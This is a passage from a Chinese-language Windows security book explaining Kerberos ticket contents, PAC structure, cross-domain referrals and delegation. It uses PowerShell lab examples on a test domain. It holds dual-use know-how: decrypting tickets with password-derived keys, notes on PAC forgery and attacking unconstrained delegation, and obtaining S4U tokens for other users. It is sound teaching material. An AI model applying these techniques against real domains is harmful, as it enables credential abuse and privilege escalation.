现在，我们可以将 AP-REQ 身份验证令牌和密钥传递给 `Unprotect-LsaAuthToken` PowerShell 命令，以解密票据和认证器。通过将解密后的身份验证令牌传递给 `Format-LsaAuthToken` 命令，我们可以显示未受保护的信息。由于解密后的票据相当大，我们将分部分检查，从 代码清单 14-8 开始。




```
PS> $ap_req = Unprotect-LsaAuthToken -Token $client.Token -Key $key
PS> $ap_req | Format-LsaAuthToken
<KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
Flags           : Forwardable, Renewable, PreAuthent, EncPARep
❶ Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
❷ Auth Time       : 5/12 5:37:40 PM
Start Time      : 5/12 5:43:07 PM
End Time        : 5/13 3:37:40 AM
Renew Till Time : 5/19 5:37:40 PM
```


*代码清单 14-8：基本的解密票据信息*

未加密的票据从Realm值开始。接下来大部分是簿记信息，包括诸如指示预认证是否发生的标志（PreAuthent）。Forwardable 标志与委派相关，我们将在稍后的“Kerberos 委派”一节中再次讨论。票据还包含被认证用户的SPN❶。因为*alice*用户为HTTP/graphite服务请求了票据，所以该用户的信息是被认证的对象。接下来，我们看到票据具有有限的生命周期，在此情况下基于认证时间❷和结束时间，使其有效约10小时。当票据过期时，客户端可以续订五天。（Renewable标志编码了关于续订票据能力的信息。）

代码清单 14-9展示了票据的下一个组成部分：随机生成的会话密钥。




```
<Session Key>
Encryption Type : ARCFOUR_HMAC_MD5
Encryption Key  : 27BD4DE38A47B87D08E03500DF116AB5
```


*代码清单 14-9：票据会话密钥*

此会话密钥用于加密认证器。客户端和服务器也可能使用它来加密和验证它们后续传输的任何密钥或数据。

之后是一系列授权数据值，服务器可以使用这些值来确定客户端用户的安全属性。其中最重要的是PAC，它包含接收Windows系统构建用户Token对象所需的一切。PAC本身分为多个部分。代码清单 14-10包含其登录信息。




```
<Authorization Data - AD_WIN2K_PAC>
<PAC Entry Logon>
<User Information> ❶
Effective Name   : alice
Full Name        : Alice Roberts
User SID         : S-1-5-21-1195776225-522706947-2538775957-1110
Primary Group    : MINERAL\Domain Users
Primary Group SID: S-1-5-21-1195776225-522706947-2538775957-513
<Groups> ❷
MINERAL\Domain Users            - Mandatory, EnabledByDefault, Enabled
<Resource Groups> ❸
Resource Group   : S-1-5-21-1195776225-522706947-2538775957 ❹
MINERAL\Local Resource          - Mandatory, EnabledByDefault, Enabled, Resource
<Extra Groups> ❺
NT AUTHORITY\Claims Valid       - Mandatory, EnabledByDefault, Enabled
Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled
<Account Details> ❻
Logon Time       : 5/12 5:37:15 PM
Password Last Set: 5/8 11:07:55 AM
Password Change  : 5/9 11:07:55 AM
Logon Count      : 26
Bad Password #   : 0
Logon Server     : PRIMARYDC
Logon Domain     : MINERAL
Logon Domain SID : S-1-5-21-1195776225-522706947-2538775957 ❼
User Flags       : ExtraSidsPresent, ResourceGroupsPresent
User Account Cntl: NormalAccount, DontExpirePassword
Session Key      : 00000000000000000000000000000000 ❽
```


*代码清单 14-10：登录PAC条目*

登录PAC条目遵循Windows 2000之前Netlogon协议中使用的格式。它以基本用户信息❶开始，例如用户名、SID和主组。接下来是组成员列表，分为三部分：域组❷、资源组❸和额外组❺。对于每个组，显示SID（如果已知则格式化为名称）以及应应用于该组的属性。出于大小原因，域组和资源组SID仅存储最后一个RID值。完整SID通过将此RID添加到登录域SID❼或资源组SID❹来分别派生。额外组列表存储完整SID，因此可以包含具有不同前缀的SID。

组信息之后是关于用户的额外簿记信息，例如他们上次登录和更改密码的时间❻。此部分还包括认证用户的服务器和域的信息，包括域名和SID。用户标志显示额外组和资源组存在于票据中。用户账户控制标志指示账户的属性（在此情况下，用户的密码永不过期）。

最后，有一个由全零组成的空会话密钥❽。只有当KDC未直接认证用户而是使用了另一种认证协议（如NTLM）时，您才会看到非空会话密钥。在这种情况下，该子认证协议的会话密钥将显示在此处；然而，在大多数情况下它将是空的。

代码清单 14-11展示了下一个PAC条目，其中包含用户的声明属性。




```
<PAC Entry UserClaims>
<ActiveDirectory Claim>
ad://ext/cn:88d7f6d41914512a - String - Alice Roberts
ad://ext/country:88d7f5009d9f2815 - String - US
ad://ext/department:88d7f500a308c4a9 - String - R&D
```


*代码清单 14-11：用户声明PAC条目*

如第4章所述，Token对象将这些用户声明作为安全属性公开，它们可以在访问控制过程中发挥作用，通常通过中央访问策略。如果目标SPN是计算机账户而非用户账户，Kerberos票据还将以设备组和设备声明的形式包含客户端设备的信息，如代码清单 14-12所示。




```
<PAC Entry Device>
Device Name      : MINERAL\GRAPHITE$
Primary Group    : MINERAL\Domain Computers
<Groups>
MINERAL\Domain Computers       - Mandatory, EnabledByDefault, Enabled
<Domain Groups>
NT AUTHORITY\Claims Valid      - Mandatory, EnabledByDefault, Enabled
<Extra Groups>
Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled

<PAC Entry DeviceClaims>
<ActiveDirectory Claim>
ad://ext/cn:88d7f6d41914512a - String - GRAPHITE
ad://ext/operatingSystem:88d7f6d534791d12 - String - Windows Enterprise
```


*代码清单 14-12：设备组和设备声明PAC条目*

与用户声明一样，您通常只会发现这些在中央访问策略中使用。代码清单 14-13显示了额外的簿记条目。




```
<PAC Entry ClientInfo>
Client ID        : 5/12 5:37:40 PM
Client Name      : alice

<PAC Entry UserPrincipalName>
Flags            : None
Name             : alice@mineral.local
DNS Name         : MINERAL.LOCAL
```


*代码清单 14-13：客户端信息和UPN PAC条目*

客户端ID字段应与用户的认证时间匹配。

代码清单 14-14 展示了应用于 PAC 数据以确保其未被篡改的几个签名。如果没有这些签名，用户就可以伪造自己的 PAC，添加任何他们希望 LSA 放入其令牌对象中的组。




```
<PAC Entry ServerChecksum>
Signature Type   : HMAC_MD5
Signature        : 7FEA93110C5E193734FF5071ECC6B3C5

<PAC Entry KDCChecksum>
Signature Type   : HMAC_SHA1_96_AES_256
Signature        : 9E0689AF7CFE1445EBACBF88

<PAC Entry TicketChecksum>
Signature Type   : HMAC_SHA1_96_AES_256
Signature        : 1F97471A222BBCDE8EC717BC
```


*代码清单 14-14：PAC 签名*

第一个签名覆盖整个 PAC。然而，由于签名字段嵌入在 PAC 内部，在计算签名时它们会被替换为零。此签名使用用于加密票证的共享密钥生成。

第二个签名用于验证服务器签名是否由 KDC 签发。此签名仅覆盖服务器部分，并使用 *krbtgt* 用户的加密密钥。要验证该签名，服务器需要将其发送给 KDC，因为它不知道加密密钥。出于性能考虑，当服务器以特权用户（如 *SYSTEM*）身份运行时，通常不执行此验证。

最后一个签名是根据移除 PAC 后的整个票证计算得出的。用于此签名的加密密钥是 *krbtgt* 用户的密钥。此签名使 KDC 能够检测票证的任何篡改，而服务器签名无法覆盖这一点，因为它仅验证 PAC。

> 注意
>
> *Windows 曾面临多个与 PAC 签名验证相关的安全问题。最著名的是 CVE-2014-6324，该问题源于 TGS 接受 CRC32 作为有效的签名机制。由于 CRC32 不具备密码学安全性，且可被轻易暴力破解，攻击者可以创建包含任意所需组（包括完整域管理员组）的有效 PAC。*

代码清单 14-15 展示了已解密 AS-REQ 消息的最后一个组件，即验证器。




```
<Authenticator>
Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
Client Time     : 5/13 2:15:03 AM
❶ Checksum        : GSSAPI
Channel Binding : 00000000000000000000000000000000
Context Flags   : None
❷ <Sub Session Key>
Encryption Type : ARCFOUR_HMAC_MD5
Encryption Key  : B3AC3B1C31937088B7B1BC880B10950E
❸ Sequence Number : 0x7DDD0DBA
❹ <Authorization Data - AD_ETYPE_NEGOTIATION>
AES256_CTS_HMAC_SHA1_96, AES128_CTS_HMAC_SHA1_96, ARCFOUR_HMAC_MD5
```


*代码清单 14-15：已解密的 AS-REQ 验证器*

验证器包含一些基本的用户信息，以及一个时间戳，指示其在客户端上创建的时间，可用于确认请求是最近的且未被重放给服务。

您可能会注意到一个奇怪的地方：存在一个校验和字段，但它似乎不包含有效的密码学哈希 ❶。这是因为验证器已将此字段重新用于存储附加信息，如类型值 GSSAPI 所示。默认情况下，此字段包含连接的通道绑定（如果指定）以及一些附加标志。在此例中，未设置通道绑定，因此通道绑定字段全为零。如果您像使用 NTLM 时那样指定了 `ChannelBinding` 参数，该字段将看起来像这样：


```
Channel Binding : BAD4B8274DC394EDC375CA8ABF2D2AEE
```


验证器包含一个子会话密钥 ❷，连接可在后续使用。它还包含一个随机生成的序列号 ❸，该序列号与时间戳一起，可以阻止尝试使用相同票证和验证器的重放攻击。最后，验证器可以包含附加的授权数据 ❹。在此例中，数据指定了 `AD_ETYPE_NEGOTIATION` 类型，允许连接尝试将使用的加密算法从 RC4 升级为 AES 加密格式之一。

代码清单 14-15 中使用的 GSSAPI 类型值代表 *通用安全服务应用程序接口（GSSAPI）*，这是一个用于实现网络身份验证协议的通用 API。在 Linux 或 macOS 上，您应使用 GSSAPI 而非 SSPI 来执行 Kerberos 身份验证。RFC2743 和 RFC2744 定义了当前版本的 GSSAPI，而 RFC4121 定义了该协议的 Kerberos 特定实现。

SSPI 与 GSSAPI 基本兼容，通常可以在网络协议文档中找到对要使用的函数的 GSSAPI 名称的引用，尤其是在加密和签名方面。例如，在 GSSAPI 中加密和解密数据，您应分别使用 `GSS_Wrap` 和 `GSS_Unwrap` 函数，而不是 SSPI 的 `EncryptMessage` 和 `DecryptMessage` API。同样，对于签名生成和验证，您应使用 `GSS_GetMIC` 和 `GSS_VerifyMIC`，而不是 `MakeSignature` 和 `VerifySignature`。由于这是一本关于 Windows 安全的书，我们不再深入探讨 GSSAPI 的细节。

### 解密 AP-REP 消息

一旦我们解密了 AP-REQ 消息中的票据和认证器，我们就拥有了解密用于相互认证的 AP-REP 所需的密钥。我们在 代码清单 14-16 中执行此操作。




```
PS> $sesskey = (Unprotect-LsaAuthToken -Token $ap_req -Key $key).Ticket.Key
PS> Unprotect-LsaAuthToken -Token $ap_rep -Key $sesskey | Format-LsaAuthToken
<KerberosV5 KRB_AP_REP>
<Encrypted Part>
Client Time      : 05-14 01:48:39
<Sub Session Key>
Encryption Type : AES256_CTS_HMAC_SHA1_96
Encryption Key  : 76F0794F1F3B8CE10C38CFA98BF74AF5229C7F626110C6302E4B8780AE91FD3A
Sequence Number : 0x699181B8
```


*代码清单 14-16：解密 AP-REP 消息*

我们首先需要从解密后的 AP-REQ 票据中获取会话密钥。使用该密钥，我们可以再次通过 `Unprotect-LsaAuthToken` 解密 AP-REP。在输出中，您可以看到新协商的会话密钥；在本例中，它已从 RC4 升级为 AES 密钥。它还包含一个序列号，以防止重放攻击。

#### 在初始认证中使用公钥

Kerberos 的一个重大弱点，尤其是对普通用户而言，在于其依赖密码来派生加密密钥。票据和相关加密数据通常通过不安全的网络传输，因此攻击者可以轻易收集与单个用户相关的大量密文，并尝试破解其密码。如果攻击成功，他们将完全危及该用户的安全。

为降低此风险，您可以将 Windows Kerberos 配置为使用公钥初始认证（PKINIT）。PKINIT 依赖公钥加密技术来执行初始会话密钥交换，而不是使用从密码派生的共享加密密钥。PKINIT 中的公钥加密技术通过标准 X.509 证书对用户进行身份验证，系统通常将这些证书及其关联的私钥存储在智能卡上，用户必须在认证前将其插入 Windows 计算机。

在向 KDC 发送初始 AS-REQ 消息时，客户端不是使用共享加密密钥加密时间戳作为预认证数据的一部分来证明密钥持有，而是使用其公钥证书对标识符进行签名，然后将其连同所用证书的副本一起发送给 KDC。KDC 可以验证签名，从而证明客户端持有相应的私钥，并检查 PKI 策略是否允许该证书（例如，确保其具有正确的根证书颁发机构和扩展密钥用法（EKU））。

如果一切检查通过，KDC 将返回会话密钥给客户端，可以通过使用公钥加密或使用 Diffie-Hellman 密钥交换来实现。因此，初始认证过程从不使用从密码派生的共享加密密钥。（当然，Windows 中的许多功能依赖于用户凭据，例如 NT 哈希，票据中的 PAC 将包含客户端的 NT 哈希，并以单独的授权数据结构进行加密。）您可以在 RFC4556 中了解更多关于 PKINIT 实现的信息。

接下来，我们将探讨与 Kerberos 服务认证相关的另一个主题：它如何跨域信任边界工作。

### 跨域身份验证

在第10章中讨论域林时，我提到了信任关系的概念，即受信任域接受存储在另一个域中的用户配置所对应的凭据。本节将讨论Kerberos协议如何在同一林中的域之间工作。尽管Kerberos身份验证也可以发生在林之间，以及与第三方Kerberos实现之间，但我们在此不涉及这些复杂情况。

图14-6展示了示例*MINERAL*域和*SALES*域之间跨域Kerberos身份验证的基本操作。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-6.webp)

图14-6：跨域Kerberos身份验证概览

*MINERAL*域中的客户端首先请求HTTP/WEB.SALES服务主体的服务票据❶。TGS无法满足此请求，因为该服务主体不在其自身域中。它检查全局编录以查看林中是否有其他域配置了该服务主体，并在*SALES*域中找到了它。

随后，TGS检查其是否与*SALES*域存在信任关系，结果确实存在。当两个域之间建立新的信任关系时，会在每个域的域控制器之间配置一个共享的Kerberos密钥。该密钥用于加密一个*引用票据*，其中包含用户信息和所请求的服务，并将其返回给客户端❷。然后，客户端将引用票据转发给*SALES*域中的TGS❸。由于该票据使用共享的跨域密钥加密，*SALES*域的TGS可以解密以验证其内容。

*SALES*域的TGS需要修改引用票据中提供的PAC，以根据用户现有的组添加*SALES*域的域本地组成员身份。随后，TGS将重新签名修改后的PAC，并将其插入服务票据中，供本地服务使用。现在，它可以为HTTP/WEB.SALES颁发服务票据，并使用服务的密钥将其返回给客户端❹。

> 注意
>
> *在复杂的跨域信任关系中，域不应信任PAC中包含的任何额外SID，因为已入侵源域的攻击者可能生成包含任意SID的PAC，进而危及目标域的安全。Windows实现了一种SID过滤机制，用于从PAC中移除被视为危险的SID，例如本地域的任何SID。然而，SID过滤的完整细节超出了本书的讨论范围。*

最后，客户端可以使用服务票据向*SALES*域中的服务进行身份验证❺。接收服务票据的服务器可以使用该票据，基于其域TGS生成的修改后PAC来构建访问令牌。

如果域之间没有直接信任关系，则可能需要多次重复此颁发引用票据的过程。例如，回到第10章中的示例域，如果*ENGINEERING*域中的用户想要向*SALES*域中的服务进行身份验证，则根*MINERAL*域首先必须颁发一个引用票据。然后，该票据可用于为*SALES*域建立引用票据。

在由多个域和树组成的更复杂林中，这种多跳引用过程可能导致性能不佳。为解决此问题，Windows提供了一种机制，可在林中的任意两个域之间建立*快捷信任*关系。域可以利用此信任关系来建立引用票据，而无需遵循正常的传递信任路径。

我们已经介绍了Kerberos身份验证的基础知识。现在让我们深入探讨更高级的主题，首先从已认证用户如何安全地将凭据转发给服务开始。

### Kerberos 委派

*委派* 使服务能够将用户的凭据转发给另一个服务。这很有用，因为当用户使用 Kerberos 连接到服务时，他们不会向服务提供自己的凭据。相反，他们提供的是使用服务器共享加密密钥加密的票据。服务可以尝试将该票据转发给另一个服务，但由于它不知道新服务的共享加密密钥，因此无法加密该票据，所以新服务不会接受它。

获取新服务加密票据的唯一方法似乎是使用 TGT 向 TGS 发送 TGS-REQ 消息。然而，原始服务只有其自身账户的 TGT，而不是用户的 TGT，并且没有用户的 TGT，服务就无法将用户的凭据转发到指定范围之外。这种行为提供了一项重要的安全措施；如果用户对某个服务进行的任何身份验证都可以被委派给另一个服务，那么很可能很容易获得域的管理员完全访问权限。

尽管如此，转发凭据仍然是一项有用的功能。例如，假设您有一个企业网络，用户只能通过外部网络经由 Web 服务器访问。如果 Web 服务器能够提供用户的凭据来访问后端系统（如数据库服务器），那将会非常有用。解决此问题的一种方法是让 Web 服务器请求用户的明文凭据，然后使用这些凭据向域进行身份验证，从而获得用户的 TGT。但实际上，从安全角度来看，这是一个糟糕的主意。

因此，为了安全地转发凭据，Kerberos 实现了一个定义的委派过程。客户端可以选择加入委派，允许目标服务代表其使用其身份来请求其他网络服务的票据。Windows 域在用户和计算机的每个账户基础上配置委派。在 GUI 中，当检查账户属性时，您会看到 图 14-7 中显示的委派对话框。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-7.webp)

图 14-7：GRAPHITE 计算机账户的委派选项卡

图 14-7 显示了委派的三个主要选项。第一个选项（默认）禁用该账户的委派。第二个选项称为 *不受约束的委派*，允许该账户使用身份验证用户的凭据委派到网络上的任何其他服务。第三个选项称为 *受约束的委派*，允许将用户的凭据委派到由允许的 SPN 列表定义的固定服务集合。

让我们深入探讨这两种委派类型的相似之处和不同之处，并了解它们是如何实现的。在以下各节中，我们将修改 Active Directory 服务器中的一些委派设置。这意味着您必须使用在域控制器上具有 SeEnableDelegationPrivilege 的用户账户执行这些操作。通常，只有管理员拥有此特权，因此您应该以域管理员身份运行这些示例。

#### 不受约束的委派

Microsoft 在 Windows 2000 中随原始 Windows Kerberos 实现一起引入了不受约束的委派。这种 Kerberos 委派机制要求客户端选择提供其 TGT 的副本，从而使服务能够委派其凭据。它仅适用于 Kerberos 身份验证，因为用户必须首先使用 Kerberos 协议向服务进行身份验证。图 14-8 概述了不受约束的委派过程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-8.webp)

图 14-8：不受约束的委派过程

此图显示客户端通过服务器 *WEB* 上的 HTTP 服务将其凭据委派给服务器 *DB* 上的数据库服务。客户端首先使用其 TGT 向 TGS 发出正常的票据请求，使用 HTTP/WEB.MINERAL SPN ❶。如果目标服务可以使用委派，则返回的票据应设置 OkAsDelegate 标志，这向客户端指示如果愿意，它可以进行委派。

然后，客户端发出第二个请求，以获取一个新的 TGT 发送给 HTTP 服务。客户端通过将目标主体名称指定为 *krbtgt* 用户并在 TGS-REQ 上设置 Forwardable 和 Forwarded 标志来表明其意图 ❷。如果允许委派，TGS 将向客户端返回此新 TGT。

客户端随后可以将原始服务票据和TGT打包到AP-REQ消息中，通过HTTP发送给服务器❸。AP-REQ还必须包含加密TGT的会话密钥信息，以便目标服务能够解密。Windows API在委派凭据时支持相互认证，因此服务器会向客户端返回AP-REP❹。

一旦HTTP服务收到AP-REQ，它可以请求LSA为该用户生成令牌。LSA还会将TGT和会话密钥信息保存到新的登录会话中。当HTTP服务需要向数据库服务进行身份验证时，它可以模拟用户的令牌并启动Kerberos认证过程。这意味着用户的TGT将被用来向TGS请求SQL/DB.MINERAL的票据❺。假设服务满足所有策略要求，TGS将返回服务票据❻，LSA会将其作为新的AP-REQ传递给数据库服务❼，从而完成委派。

由于委派的TGT通过AP-REQ消息发送，我们应该能够在PowerShell中检查本地认证期间发生的委派过程。认证用户需要注册一个SPN。我们将使用 *alice* 用户，我们在前文“解密 AP-REQ 消息”一节中为其添加了 SPN。首先，我们必须为该用户启用无约束委派。您可以使用GUI启用委派，或者以域管理员身份运行以下Set-ADAccountControl PowerShell命令：


```
PS> Set-ADAccountControl -Identity alice -TrustedForDelegation $true
```


您可以使用Get-ADUser或Get-ADComputer命令（取决于账户类型）验证委派是否已启用，如代码清单 14-17所示。



```
PS> Get-ADUser -Identity alice -Properties TrustedForDelegation |
Select-Object TrustedForDelegation
TrustedForDelegation
--------------------
                True
```


*代码清单 14-17：查询用户的TrustedForDelegation属性*

现在，让我们创建一个客户端认证上下文，并请求带有委派票据的AP-REQ消息（代码清单 14-18）。



```
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
❶ PS> $client = New-LsaClientContext -CredHandle $credout -Target 
"HTTP/graphite"-RequestAttribute MutualAuth, Delegate
PS> $key = Get-KerberosKey -Password "AlicePassw0rd" -KeyType ARCFOUR_HMAC_MD5
-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"
PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key | 
Format-LsaAuthToken
<KerberosV5 KRB_AP_REQ>
Options         : MutualAuthRequired
<Ticket>
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
❷ Flags           : Forwardable, Renewable, PreAuthent, OkAsDelegate, EncPARep
--snip--
```


*代码清单 14-18：请求AP-REQ并显示委派票据*

我们必须同时指定MutualAuth和Delegate标志❶，以便LSA请求委派的TGT。请注意，生成的票据中设置了OkAsDelegate标志❷。无论客户端是否请求委派，该标志都会存在，因为LSA会将其与委派请求属性结合，以决定是否请求TGT。

认证器将新的TGT存储为GSSAPI校验和的一部分，如代码清单 14-19所示。



```
<Authenticator>
Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
Client Time     : 5/15 1:51:00 PM
Checksum        : GSSAPI
Channel Binding : 00000000000000000000000000000000
❶ Context Flags   : Delegate, Mutual
Delegate Opt ID : 1
<KerberosV5 KRB_CRED>
❷ <Ticket 0>
Ticket Version  : 5
❸ Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 49 FA B2 17 34 F9 0F D6 0C DE A3 67 54 9E 74 B7
00000010: 4E 1B 18 DC 91 40 F1 91 DC 42 37 64 CC 39 56 78
--snip--
000005D0: E5 D5 99 FD 15 2B
❹ <Encrypted Part>
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 3B 25 F6 CA 18 B4 E6 D4 C0 77 07 66 73 0E 67 9C
--snip--
```


*代码清单 14-19：带有委派TGT的AP-REQ认证器*

如果将这个认证器与代码清单 14-15中显示的认证器进行比较，您首先注意到的区别应该是Delegate和Mutual上下文标志都被设置了❶。

Delegate标志表示*Kerberos凭据（KRB-CRED）*结构被打包到Checksum字段中。在KRB-CRED中，我们找到了TGT票据❷。我们可以判断它是一个TGT，因为它是为*krbtgt*主体颁发的❸。KRB-CRED结构还包含一个额外的加密部分，用于保存与TGT配套的会话密钥❹。

如果我们能够完成认证，就可以获得模拟令牌。LSA现在拥有足够的信息，服务可以代表提供委派TGT的用户请求任何服务票据，如代码清单 14-20所示。



```
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Client $client
PS> Use-NtObject($token = Get-LsaAccessToken $server) {
    Format-NtToken $token -Information
}
TOKEN INFORMATION
-----------------
Type       : Impersonation
Imp Level  : Delegation
--snip--
```


*代码清单 14-20：完成委派认证过程*

请注意，代码清单 14-20中的Token对象具有Delegation模拟级别。某些内核API会强制执行此模拟级别，包括SeCreateClientSecurity，它捕获调用客户端的令牌以供SeImpersonateClient内核API后续使用。SeCreateClientSecurity API接受一个布尔类型的ServerIsRemote参数。如果该参数为True，当模拟级别不是Delegation时，API将无法捕获令牌。然而，像SMB这样的知名调用者不会将该参数设置为True。因此，只要登录会话中存在可用凭据，Delegation模拟级别在本地和远程访问中实际上等同于Impersonation级别。

> 注意
>
> *在Windows 10及更高版本中，你可以启用一项名为Credential Guard的功能，它利用虚拟化技术保护用户凭据（包括LSA存储的Kerberos TGT会话密钥），防止特权用户读取LSASS进程内存时泄露这些凭据。由于非约束委派会引入泄露用户TGT会话密钥的机制，因此启用Credential Guard后将无法再使用该功能。*

#### 约束委派

微软在Windows 2003中引入了约束委派，也称为*用户服务（S4U）*。其目的是修复非约束委派中的安全弱点：即一旦用户将凭据委派给某个服务，该服务就可以模拟用户访问同一域中的任何其他服务，即使这些服务与原始服务的用途完全无关。

这使得任何启用非约束委派的服务都成为攻击的绝佳目标。如果你攻陷了该服务，并能说服特权用户将其凭据委派给它，你就有很大机会攻陷整个网络。从技术上讲，用户需要主动选择委派其凭据，但常见的客户端应用程序（如Internet Explorer）默认就会这样做，并且在建立客户端身份验证上下文时始终传递委派请求属性。

微软通过允许管理员指定服务可用于委派的显式SPN列表来解决这一安全弱点。例如，管理员可以将前面讨论的HTTP服务限制为仅委派给数据库服务，而不能委派给其他任何服务。

约束委派可以以三种模式工作：

- 仅Kerberos委派
- 协议转换委派
- 基于资源的委派

我们将在以下各节中依次介绍每种模式。

##### 仅Kerberos委派

在官方文档中也称为*用户到代理服务（S4U2proxy）*，仅Kerberos委派模式的工作方式与非约束委派非常相似。它要求用户使用Kerberos向中间服务进行身份验证，如图14-9所述。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-9.webp)

图14-9：约束仅Kerberos委派概述

虽然这看起来与图14-8非常相似，但存在细微差别。首先，原始用户请求一个普通的HTTP服务服务票证❶，而不是额外的TGT。用户可以将此服务票证打包到AP-REQ消息中并发送给HTTP服务❷。HTTP服务随后希望将用户的身份验证委派给数据库服务，因此它向TGS请求服务票证，并附上自己的TGT。它还将用户用于其自身服务的服务票证附加到TGS-REQ消息中❸。

TGS检查该请求。如果用户的服务票证设置了Forwardable标志，并且数据库服务在发起票证请求的账户的允许服务列表中，TGS将使用用户用于HTTP服务的服务票证来生成用于数据库服务的服务票证❹。该服务可以像平常一样将此票证及相关信息打包到AP-REQ消息中，并发送给数据库服务❺。

虽然看起来用户似乎无法控制其凭据的委派，但用户可以通过简单地选择不请求可转发的服务票证来阻止委派。我们稍后将讨论如何取消设置Forwardable标志。

账户可以委派到的服务的SPN列表存储在Active Directory中用户或计算机账户条目的`msDS-AllowedToDelegateTo`属性中。你可以使用PowerShell中的`Set-ADUser`或`Set-ADComputer`设置此属性，如代码清单 14-21所示。




```
PS> $spns = @{'msDS-AllowedToDelegateTo'=@('CIFS/graphite')}
PS> Set-ADUser -Identity alice -Add $spns
```


*代码清单 14-21：为* alice *账户添加新的msDS-AllowedToDelegateTo条目*

要查询SPN列表，请使用`Get-ADUser`或`Get-ADComputer`，如代码清单 14-22所示。




```
PS> Get-ADUser -Identity alice -Properties 'msDS-AllowedToDelegateTo' |
Select-Object -Property 'msDS-AllowedToDelegateTo'
msDS-AllowedToDelegateTo
------------------------
{CIFS/graphite}
```


*代码清单 14-22：查询msDS-AllowedToDelegateTo属性*

在此示例中，我们确认可以委派到CIFS/graphite服务。

##### 协议转换委派

要求对域进行端到端的Kerberos认证并不总是可行的。例如，如果访问HTTP服务的用户位于公共网络中，无法直接连接到KDC获取服务票据，该怎么办？这时，第二种类型的受约束委派——协议转换委派，在文档中称为*Service for User to Self（S4U2self）*——可能会派上用场。它执行*认证协议转换*，这意味着前端HTTP服务可以使用自身的认证机制进行认证，然后利用该信息，以用户的域凭据为数据库服务构造服务票据，而无需用户了解Kerberos。

图14-10展示了使用认证协议转换进行受约束委派的步骤。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-10.webp)

图14-10：使用认证协议转换的受约束委派概述

用户首先向HTTP服务发出请求并提供认证凭据❶。这些凭据不必与我们想要使用的Kerberos凭据相关，所使用的认证协议可以是任何类型，例如基本的HTTP认证。HTTP服务将认证用户映射到域账户，然后向TGS请求一个针对自身的服务票据，并使用该域账户的信息❷。

TGS收集目标用户的所有详细信息（如其组成员身份），将其放入PAC中，并将服务票据发送回服务。由于票据是针对服务自身的，LSA可以解密票据，提取PAC，并生成一个Token对象。

这个过程可能看起来有些危险。毕竟，它允许你在不要求任何用户认证的情况下凭空请求服务票据。信不信由你，这正是S4U2self的工作方式；但请记住，生成的令牌仅对本地系统有用。LSA已经可以合成包含任意组的令牌并在本地使用，因此这并不会改变系统的安全属性。

然而，与合成的本地令牌不同，LSA拥有S4U2self服务票据的副本。如果服务的账户配置了委派，它可以使用S4U2proxy和S4U2self服务票据来为允许的服务请求服务票据❸。然后，它可以将这个新的服务票据打包到AP-REQ中，并使用它来向数据库服务进行认证❹。

你可以通过设置`msDS-AllowedToDelegateTo`中的允许SPN列表，并将用户账户控制标志`TrustedToAuthForDelegation`设置为True，来配置S4U2self允许转换到S4U2proxy。你已经在代码清单 14-21中看到了如何修改允许的SPN。你可以使用以下命令设置`TrustedToAuthForDelegation`标志：


```
PS> Set-ADAccountControl -Identity alice -TrustedToAuthForDelegation $true
```


要查询该标志的状态，请使用`Get-ADUser`或`Get-ADComputer`，如代码清单 14-23所示。




```
PS> Get-ADUser -Identity alice -Properties TrustedToAuthForDelegation |
Select-Object -Property TrustedToAuthForDelegation
TrustedToAuthForDelegation
--------------------------
                      True
```


*代码清单 14-23：查询TrustedToAuthForDelegation标志*

你会注意到，我们没有检查是否可以请求初始的S4U2self票据。如前所述，这只是本地系统安全的问题。如果没有配置S4U2proxy，计算机无法在网络请求中使用这些凭据。实际上，Windows上的任何用户都可以使用`LsaLogonUser`或通过`Get-NtToken`命令请求S4U令牌，即使未连接到企业网络。

代码清单 14-24显示我们当前以*alice*用户身份运行。让我们尝试为另一个用户请求令牌。




```
PS> Show-NtTokenEffective
MINERAL\alice

❶ PS> $token = Get-NtToken -S4U -User bob -Domain MINERAL
PS> Format-NtToken $token
❷ MINERAL\bob

PS> Format-NtToken $token -Information
TOKEN INFORMATION
-----------------
Type       : Impersonation
❸ Imp Level  : Identification
--snip--
```


*代码清单 14-24：以普通用户身份请求S4U2self令牌*

在这里，我们使用带有S4U参数的`Get-NtToken`为*bob*用户请求令牌❶。注意，我们不需要指定密码。我们可以通过格式化来确认该令牌确实是针对*bob*的❷。

如果LSA不将令牌限制为Identification级别，这种设计将造成巨大的本地安全漏洞，这会阻止普通用户使用该令牌访问受保护的资源❸。获得Impersonation级别令牌的唯一方法是启用`SeTcbPrivilege`，而默认情况下只有本地*SYSTEM*账户拥有该特权。因此，通常会在*SYSTEM*账户使用的计算机账户上配置`TrustedToAuthForDelegation`，以便它能够以Impersonation级别模拟S4U2self令牌，然后让LSA查询S4U2proxy票据。

##### 基于资源的委派

